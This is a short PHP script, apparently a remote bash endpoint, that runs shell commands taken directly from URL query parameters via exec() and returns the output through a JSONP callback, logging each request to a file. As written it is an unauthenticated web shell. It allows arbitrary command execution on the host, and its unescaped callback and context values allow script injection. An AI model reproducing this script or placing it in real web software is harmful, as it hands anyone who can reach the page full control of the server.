<?php
  $timeStamp = date('c');
  $logEntry = "<code time='$timeStamp'>". json_encode($_GET) . json_encode($_POST) ."</code>";
  file_put_contents('bashoola.log', $logEntry, FILE_APPEND);

  $callback = $_GET['callback'];
  $context = $_GET['context'];
  unset($_GET['callback']);
  unset($_GET['context']);
  echo "bash_out = '';";
  foreach ($_GET as $command => $arguments) {
    exec("bash -$command '$arguments' 2>&1", $out);
	foreach ($out as $l) {
		$l = htmlentities(addslashes($l));
		echo "bash_out += '$l<br />';";
	}
  }
  echo "$callback('$context', bash_out);";
?>
